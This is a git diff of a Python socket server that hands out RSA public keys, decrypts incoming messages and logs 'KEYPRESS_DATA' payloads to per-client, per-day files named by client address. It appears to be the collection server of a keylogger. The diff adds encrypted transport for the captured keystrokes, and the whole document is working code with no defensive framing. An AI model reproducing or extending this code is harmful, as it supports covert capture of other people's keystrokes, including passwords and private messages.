@@ -35,7 +35,7 @@ def write_msg_to_file(msg, addr, client_log_dir):
 
     with open(today_logfile_path, "a") as logfile:
         logfile.write("--------" + time + "--------\n")
-        logfile.write(msg)
+        logfile.write(msg + "\n")
         logfile.close()
 
     return
@@ -57,18 +57,33 @@ def handle_key_request(clientsock):
     key_response_packet.type = "PUB_KEY"
     key_response_packet.data = public_key_bytes.decode()
 
-    print(key_response_packet.data)
-
     key_response_str = json.dumps(key_response_packet.__dict__)
     clientsock.sendall(key_response_str.encode("utf-8"))
-    print("public key sent")
 
     return private_key
 
+def decrypt_cipher(cipher, private_key):
+    cipher_decrypted = private_key.decrypt(
+        cipher,
+        padding.OAEP(
+            mgf=padding.MGF1(algorithm=hashes.SHA256()),
+            algorithm=hashes.SHA256(),
+            label=None            
+        )
+    )
+
+    return cipher_decrypted
+
 def on_new_client(clientsock, addr):
     print("new thread created")
+    private_key = None
+
     while True:
-        data = clientsock.recv(256).decode('utf-8')
+        data = clientsock.recv(256)
+
+        if private_key:
+            data = decrypt_cipher(data, private_key)
+
         data_dict = json.loads(data)
 
         print(addr, ">>", data)
@@ -82,8 +97,10 @@ def on_new_client(clientsock, addr):
                     print("Creation of directory at", client_log_dir, "failed")
             
             if data_dict["type"] == "KEY_REQ":
+                print("key request received")
                 private_key = handle_key_request(clientsock)
-            else:
+                print("public key issued to ", addr)
+            elif data_dict["type"] == "KEYPRESS_DATA":
                 write_msg_to_file(data_dict["data"], addr, client_log_dir)
     
 def main():
@@ -110,5 +127,5 @@ def main():
         threads.append(t)
         t.start()
 
-    
-main()
+if __name__ == "__main__":
+    main()
